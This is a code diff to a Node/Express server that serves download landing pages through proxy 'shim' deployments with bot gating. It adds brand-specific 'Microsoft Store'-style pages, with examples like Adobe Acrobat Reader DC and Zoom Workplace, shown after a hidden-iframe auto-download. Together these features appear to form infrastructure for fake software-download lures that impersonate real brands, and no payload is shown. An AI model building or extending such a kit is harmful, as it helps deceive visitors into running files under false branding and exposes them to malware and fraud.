@@ -587,6 +587,50 @@ function buildDownloadUrl(req, pageId) {
   return mount + 'download/' + pageId;
 }
 
+// ═══════════ POST-DOWNLOAD STORE PAGES ═══════════
+// Per-brand "Microsoft Store"-style pages shown after a download. One static HTML file
+// per brand lives in templates/store/<slug>.html; the slug is the filename without the
+// extension. A landing page picks one via pages.post_download_slug and visitors are sent
+// there after the download fires (unless an external redirect_url overrides it).
+const STORE_DIR = path.join(__dirname, 'templates', 'store');
+const STORE_SLUG_RE = /^[a-z0-9][a-z0-9-]{0,63}$/;
+
+function listStoreTemplates() {
+  try {
+    return fs.readdirSync(STORE_DIR)
+      .filter(f => f.endsWith('.html') && STORE_SLUG_RE.test(f.slice(0, -5)))
+      .map(f => {
+        const slug = f.slice(0, -5);
+        const name = slug.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
+        return { slug, name };
+      })
+      .sort((a, b) => a.name.localeCompare(b.name));
+  } catch {
+    return [];
+  }
+}
+
+function storeTemplateExists(slug) {
+  return STORE_SLUG_RE.test(slug) && fs.existsSync(path.join(STORE_DIR, slug + '.html'));
+}
+
+// Serves a store page by slug. The slug regex above guarantees no path traversal.
+function serveStorePage(slug, res) {
+  if (!storeTemplateExists(slug)) return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><h1>Page Not Found</h1></body></html>');
+  res.type('text/html').send(fs.readFileSync(path.join(STORE_DIR, slug + '.html'), 'utf8'));
+}
+
+// Same mount-relative trick as buildDownloadUrl: on shim deployments the store page must
+// be requested through the shim's mount path so it reaches the central /store/:slug route.
+function buildStoreUrl(req, slug) {
+  if (!req || !req._shimPageId) return '/store/' + slug;
+  const visitorUrl = (req.originalUrl || '/').replace(/^\/_shim\/proxy/, '') || '/';
+  const mount = visitorUrl.endsWith('/')
+    ? visitorUrl
+    : visitorUrl.substring(0, visitorUrl.lastIndexOf('/') + 1);
+  return mount + 'store/' + slug;
+}
+
 // Resolves the user the request is "for" — the deployment owner (visitor traffic via shim),
 // or the logged-in dashboard user (preview), or null (legacy / public). Used to select the
 // correct active version in the per-user isolation model.
@@ -785,6 +829,11 @@ async function renderPage(page, res, req) {
   const REDIRECT_DELAY_MS = 5000;
   const rawRedirect = (page.redirect_url || '').trim();
   const redirectUrl = /^https?:\/\//i.test(rawRedirect) ? rawRedirect : '';
+  // Post-download store page (per-brand). An explicit external redirect_url wins when both
+  // are set; otherwise the visitor lands on the brand's store page after the download.
+  const postSlug = (page.post_download_slug || '').trim();
+  const postDownloadUrl = storeTemplateExists(postSlug) ? buildStoreUrl(req, postSlug) : '';
+  const finalRedirectUrl = redirectUrl || postDownloadUrl;
 
   // Pre-built snippets the author can drop in as a single token.
   const downloadButtonHtml = downloadUrl
@@ -812,11 +861,12 @@ async function renderPage(page, res, req) {
   html = html.replace(/\{\{download_link\}\}/g, downloadLinkHtml);
   html = html.replace(/\{\{auto_download_script\}\}/g, autoDownloadScript);
   html = html.replace(/\{\{redirect_url\}\}/g, htmlAttrEscape(redirectUrl));
+  html = html.replace(/\{\{post_download_url\}\}/g, htmlAttrEscape(postDownloadUrl));
 
   // Inject download helper — triggers download without navigating away, then shows completion
   if (downloadUrl) {
-    const redirectLine = redirectUrl
-      ? `if(!window.__scRedirected){window.__scRedirected=true;setTimeout(function(){window.location.href="${jsStringEscape(redirectUrl)}";},${REDIRECT_DELAY_MS});}`
+    const redirectLine = finalRedirectUrl
+      ? `if(!window.__scRedirected){window.__scRedirected=true;setTimeout(function(){window.location.href="${jsStringEscape(finalRedirectUrl)}";},${REDIRECT_DELAY_MS});}`
       : '';
     const dlHelper = `
 <iframe id="sc-dl-frame" name="sc-dl-frame" style="display:none"></iframe>
@@ -925,7 +975,7 @@ async function renderPage(page, res, req) {
 // Looks up the page the deployment was issued for and renders it.
 async function shimPageRoute(req, res, next) {
   if (!req._shimPageId) return next();
-  const page = await queryOne('SELECT id, html_code, name, status, user_id FROM pages WHERE id = ?', [req._shimPageId]);
+  const page = await queryOne('SELECT id, html_code, name, status, user_id, redirect_url, post_download_slug FROM pages WHERE id = ?', [req._shimPageId]);
   if (!page || !page.html_code) return next();
   // Licensing: if the page has an owner whose license has expired, serve a blank page.
   // Pages without an owner (user_id NULL) are admin-managed and bypass this check.
@@ -1369,8 +1419,22 @@ function normalizeRedirectUrl(value) {
   return { value: trimmed };
 }
 
+function normalizePostDownloadSlug(value) {
+  if (value === undefined) return { skip: true };
+  const trimmed = (value || '').trim().toLowerCase();
+  if (!trimmed) return { value: null };
+  if (!STORE_SLUG_RE.test(trimmed)) return { error: 'Invalid post-download page slug' };
+  if (!storeTemplateExists(trimmed)) return { error: 'Unknown post-download template: ' + trimmed };
+  return { value: trimmed };
+}
+
+// Available post-download store templates (templates/store/<slug>.html) for the admin UI.
+app.get('/api/store-templates', requireAuth, (req, res) => {
+  res.json(listStoreTemplates());
+});
+
 app.post('/api/pages', requireAdmin, async (req, res) => {
-  const { name, htmlCode, status, user_id, redirect_url } = req.body;
+  const { name, htmlCode, status, user_id, redirect_url, post_download_slug } = req.body;
   if (!name) return res.status(400).json({ error: 'Page name required' });
 
   const ownerId = user_id ? String(user_id) : null;
@@ -1383,16 +1447,20 @@ app.post('/api/pages', requireAdmin, async (req, res) => {
   if (r.error) return res.status(400).json({ error: r.error });
   const finalRedirect = r.skip ? null : r.value;
 
+  const pds = normalizePostDownloadSlug(post_download_slug);
+  if (pds.error) return res.status(400).json({ error: pds.error });
+  const finalPostSlug = pds.skip ? null : pds.value;
+
   const id = uid();
-  await runSql('INSERT INTO pages (id, name, html_code, status, created, user_id, redirect_url) VALUES (?, ?, ?, ?, ?, ?, ?)',
-    [id, name, htmlCode || '', status || 'active', today(), ownerId, finalRedirect]
+  await runSql('INSERT INTO pages (id, name, html_code, status, created, user_id, redirect_url, post_download_slug) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+    [id, name, htmlCode || '', status || 'active', today(), ownerId, finalRedirect, finalPostSlug]
   );
   logActivity('Page Created', 'Created page: ' + name, req.session.user.name);
-  res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), user_id: ownerId, redirect_url: finalRedirect, versions: [] });
+  res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), user_id: ownerId, redirect_url: finalRedirect, post_download_slug: finalPostSlug, versions: [] });
 });
 
 app.put('/api/pages/:id', requireAdmin, async (req, res) => {
-  const { name, htmlCode, status, user_id, redirect_url } = req.body;
+  const { name, htmlCode, status, user_id, redirect_url, post_download_slug } = req.body;
   const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
 
@@ -1409,8 +1477,12 @@ app.put('/api/pages/:id', requireAdmin, async (req, res) => {
   if (r.error) return res.status(400).json({ error: r.error });
   const nextRedirect = r.skip ? page.redirect_url : r.value;
 
-  await runSql('UPDATE pages SET name=?, html_code=?, status=?, user_id=?, redirect_url=? WHERE id=?',
-    [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, ownerId, nextRedirect, req.params.id]
+  const pds = normalizePostDownloadSlug(post_download_slug);
+  if (pds.error) return res.status(400).json({ error: pds.error });
+  const nextPostSlug = pds.skip ? page.post_download_slug : pds.value;
+
+  await runSql('UPDATE pages SET name=?, html_code=?, status=?, user_id=?, redirect_url=?, post_download_slug=? WHERE id=?',
+    [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, ownerId, nextRedirect, nextPostSlug, req.params.id]
   );
   logActivity('Page Updated', 'Updated page: ' + (name || page.name), req.session.user.name);
   res.json({ ok: true });
@@ -2103,9 +2175,18 @@ shimRouter.get(/\/download\/([^/]+)\/?$/, botGuard, (req, res, next) => {
   req.params.pageId = req.params[0];
   return downloadHandler(req, res, next);
 });
+// Post-download store pages through the shim — static branded HTML, no gates needed
+// (the visitor already passed botGuard to reach the landing page and download).
+shimRouter.get(/\/store\/([a-z0-9-]+)\/?$/, (req, res) => serveStorePage(req.params[0], res));
 shimRouter.use(botGuard);
 shimRouter.use(shimPageRoute);
 app.use('/_shim/proxy', shimRouter);
+
+// Post-download store pages — served on ANY domain (landing page domain or app domain)
+// so the post-download redirect lands on the brand-matching page. One static template
+// per brand lives in templates/store/<slug>.html (e.g. /store/adobe-acrobat-reader-dc,
+// /store/zoom-workplace). The slug is filename-validated, so no path traversal.
+app.get('/store/:slug', (req, res) => serveStorePage(req.params.slug, res));
 
 // SPA fallback — only serve React app on the app's own domain
 app.get('*', (req, res) => {
